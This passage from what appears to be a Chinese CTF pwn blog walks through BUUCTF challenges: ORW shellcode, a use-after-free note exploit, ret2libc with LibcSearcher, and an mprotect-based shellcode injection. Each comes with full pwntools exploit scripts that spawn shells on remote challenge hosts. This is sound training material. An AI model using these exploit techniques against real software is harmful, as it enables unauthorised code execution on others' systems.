class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnable.tw </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>堆漏洞uaf</title>
      <link href="/2021/11/17/hitcontraining_uaf/"/>
      <url>/2021/11/17/hitcontraining_uaf/</url>
      
        <content type="html"><![CDATA[<p>uaf</p><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>UAF漏洞全称为use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是C++对象，利用UAF修改C++的虚函数表导致的任意代码执行。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="BUUCTF-PWN——hitcontraining-uaf"><a href="#BUUCTF-PWN——hitcontraining-uaf" class="headerlink" title="[BUUCTF]PWN——hitcontraining_uaf"></a>[BUUCTF]PWN——hitcontraining_uaf</h3><ol><li>checksec检查，开了NX保护，32位</li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171548682.png" alt="image-20211117154838315"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171549415.png" alt="image-20211117154930218"></p><p>(1) add note</p><p><img src="https://img-blog.csdnimg.cn/20210602182659998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTU1NjQ0MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>add会申请两次内存,第一次申请8个字节,前四个字节指向print_note_content这个函数, 后四个字节指向我们写入的字符串(count会加1)</p><p>(2) delete note</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171557904.png" alt="image-20211117155714676"></p><p>只释放了堆块里的内容但没有将指针置0，存在uaf漏洞，并未指向NULL</p><p>(3)  print note</p><p><img src="https://img-blog.csdnimg.cn/2020090722450461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p><p>调用add申请的第一个8个字节中的前四个字节指向的函数,打印add创建的第二个chunk里的值</p><p><img src="https://img-blog.csdnimg.cn/20200907225210334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（4） shell</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171626096.png" alt="image-20211117162634035"></p><p>fastbin是单向链表遵循先进后出原则，申请A,B两个堆块后，先释放A ，后释放B，会在fastbin里形成链,此时，再次申请一个大小为0x8的内存C，并写入shellcode地址，那么第一个8个字节C就指向B，第二个8个字节C指向A，这时候我们写入的内容就会覆盖原有的，但原来的指针仍指向它，因而可以更改print_note_content函数为我们想要执行的函数。</p><p>在add中，我们只能对content部分进行操作，无法对print_note_content对应的部分即put段进行操作，所以我们要想办法，操作put段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据put段和content段中大小的不同，如果要申请到put段，payload大小应该为0x8，由于先进后出原则，先释放A，后释放B，此时第三次申请的put段指向B的put，content段指向A的put，content写入magic，调用print_note(0)时就调用了magic</span><br></pre></td></tr></table></figure><p>申请过程堆块变化：<br>add:</p><p><img src="https://img-blog.csdnimg.cn/2020090723023881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>free后：<br><img src="https://img-blog.csdnimg.cn/20200907230643335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>再次申请，写入shell<br><img src="https://img-blog.csdnimg.cn/20200907231047979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>先进后出原则</p><p>wp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node4.buuoj.cn&#x27;,27609)</span></span><br><span class="line">shell_add = <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">idx</span>):</span></span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">48</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">48</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p32(shell_add))</span><br><span class="line">printf(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种思路double free</span></span><br><span class="line"><span class="comment">#add(8,&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line"><span class="comment">#add(40,&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment">#add(8,p32(shell_addr))</span></span><br><span class="line"><span class="comment">#printf(1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163714805316780261940769%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163714805316780261940769%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187</a></p><p><a href="https://www.anquanke.com/post/id/190589">IE漏洞学习笔记（二）：UAF释放后重用</a></p><p><a href="https://www.anquanke.com/post/id/176694">One_gadget和UAF结合利用堆溢出漏洞研究</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>ret2libc，fmtstr</p><span id="more"></span><h2 id="一-基础知识补充"><a href="#一-基础知识补充" class="headerlink" title="一. 基础知识补充"></a>一. 基础知识补充</h2><ol><li><p>指令指针寄存器，是存放下次将要执行的指令在代码段的偏移量，RIP、EIP、IP(Instruction Pointer)分别为64位、32位、16位指令指针寄存器</p></li><li><p>以64位程序为例:</p><p>在执行call指令的时候，会向栈中压入call指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行</p><p>push rbp ;将父函数栈底压入栈中<br>mov rbp, rsp ;将父函数栈顶变为子函数栈底<br>sub rsp, 0x70 ;向低地址处为子函数开辟栈帧</p><p>在函数调用结束的时候，程序会执行这两条指令<br>leave指令相当于执行了如下两条指令<br>mov esp ebp<br>pop ebp</p><p>ret指令则可以理解为将栈中的返回地址pop给rip的操作，从而回到父函数继续执行</p></li></ol><h2 id="二-ret2text"><a href="#二-ret2text" class="headerlink" title="二. ret2text"></a>二. ret2text</h2><p>栈溢出函数：strcpy</p><p>程序本身存在fflush函数，我们可以直接用它的sh来当作system的参数</p><h2 id="三-ret2libc"><a href="#三-ret2libc" class="headerlink" title="三. ret2libc"></a>三. ret2libc</h2><h3 id="泄露libc利用思路："><a href="#泄露libc利用思路：" class="headerlink" title="泄露libc利用思路："></a>泄露libc利用思路：</h3><ol><li>利用write函数来泄露程序的libc版本</li><li>知道libc版本后去计算程序里的system函数和字符串“/bin/sh”的地址</li><li>覆盖返回地址为system（‘/bin/sh’），获取shell</li></ol><h3 id="例题：2018-rop"><a href="#例题：2018-rop" class="headerlink" title="例题：2018_rop"></a>例题：2018_rop</h3><p><img src="https://img-blog.csdnimg.cn/20201006145006742.png#pic_center" alt="在这里插入图片描述"></p><p><code>1:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>)) <span class="comment"># 获取write函数地址</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先填充‘a’*（0x88+4）造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用write函数，之后跟上main函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造rop）<br>p32（0）+p32(write_addr)+p32(4)是在设置write函数的参数，对应函数原型看一下，32位程序是4位，所以这边写的4，对应的64位程序是8位。</p><p><code>2:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)     <span class="comment">#计算偏移量</span></span><br><span class="line">                                <span class="comment">#偏移量=程序里的函数地址-libc里的函数地址</span></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>3:</code></p><p>构造rop获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br></pre></td></tr></table></figure><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27043</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是我在这么写的时候出现了 <code>timeout: the monitored command dumped core</code>,尝试泄露read函数的真实地址，再调用read函数来找到偏移。(后来找到问题有：payload的顺序错误也会导致timeout和找不到libc,timeout对应payload:填充+got表+plt表+main，找不到libc对应payload:填充+pop_rdi_ret+binsh_system,对应64位栈溢出，32位和64位不同)</p><p>64位查找pop_rdi:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary bjdctf_2020_babyrop |grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./2018_rop&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28628</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x080484C6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) </span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>)</span><br><span class="line">payload += p32(sys_addr) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>LibcSearcher使用方法：将exp放在libcsearcher的安装目录下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;25295&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line">rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line">pus_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()　　　　<span class="comment">#接收 encrypt  的两个 puts函数输出;</span></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))  <span class="comment">#得到 puts 函数 的地址;</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)       <span class="comment"># 得到 libc的版本;</span></span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)     <span class="comment">#    得到偏移地址</span></span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)     <span class="comment">#  利用偏移地址 得到 system函数的地址</span></span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)     <span class="comment">#               得到  bin/sh 的 地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)      <span class="comment">#   再一次执行 一遍流程</span></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>plt表-》got表</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170953007.png" alt="image-20211117095319554"></p><h2 id="四-利用mprotect修改内存权限"><a href="#四-利用mprotect修改内存权限" class="headerlink" title="四.  利用mprotect修改内存权限"></a>四.  利用mprotect修改内存权限</h2><p>mprotect函数，可以用它来修改我们，内存栈的权限，让它可读可写可执行，进而修改内存权限。</p><h3 id="ROPgadget使用"><a href="#ROPgadget使用" class="headerlink" title="ROPgadget使用"></a>ROPgadget使用</h3><p>例题：not_the_same_3dsctf_2016</p><p>利用<code>mprotect</code>函数修改bss段为<code>0x7</code>即<code>0b111</code>，可读可写可执行权限，然后利用read函数读入shellcode，最后跳转到shellcode的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary not_the_same_3dsctf_2016--only &quot;pop|ret&quot;|grep pop</span><br></pre></td></tr></table></figure><p>需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8</p><p>ctrl+s调出程序的段表，将.got.plt段改为可读可写可执行,addr=0x80eb000</p><p>将返回地址填写成read函数，设置read函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最后读入shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mprotect函数的利用，将目标地址：.got.plt或.bss段 修改为可读可写可执行</span></span><br><span class="line"><span class="built_in">int</span> mprotect(const void *start, size_t <span class="built_in">len</span>, <span class="built_in">int</span> prot);</span><br><span class="line">argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt/.bss起始地址) </span><br><span class="line">argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 <span class="number">0x1000</span> (<span class="number">0x1000</span>通过程序启动时查看该内存块的大小的到的)</span><br><span class="line">argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 <span class="number">7</span> = <span class="number">4</span> + <span class="number">2</span> +<span class="number">1</span> (rwx)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27; | grep pop</span></span><br><span class="line">pop3_addr = <span class="number">0x0806fcc8</span> <span class="comment"># pop esi ; pop ebx ; pop edx ; ret</span></span><br><span class="line">payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span> + <span class="number">0x4</span> * <span class="string">&#x27;b&#x27;</span> + p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload += p32(pop3_addr) <span class="comment"># 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个pop</span></span><br><span class="line">payload += p32(argu1) + p32(argu2) + p32(argu3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 紧接着返回地址为 read对修改的目标地址写入shellcode</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">payload += p32(pop3_addr) <span class="comment"># 同样栈还原，为了执行紧接着的 目标地址</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(argu1) + p32(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># read写完后 写入执行的目标地址</span></span><br><span class="line">payload += p32(argu1)</span><br><span class="line"><span class="comment"># 先进行sendline执行到read等待输入</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 继续sendline发送shellcode</span></span><br><span class="line">sh.sendline(asm(shellcraft.sh(), arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>))</span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">proc_name = <span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span></span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 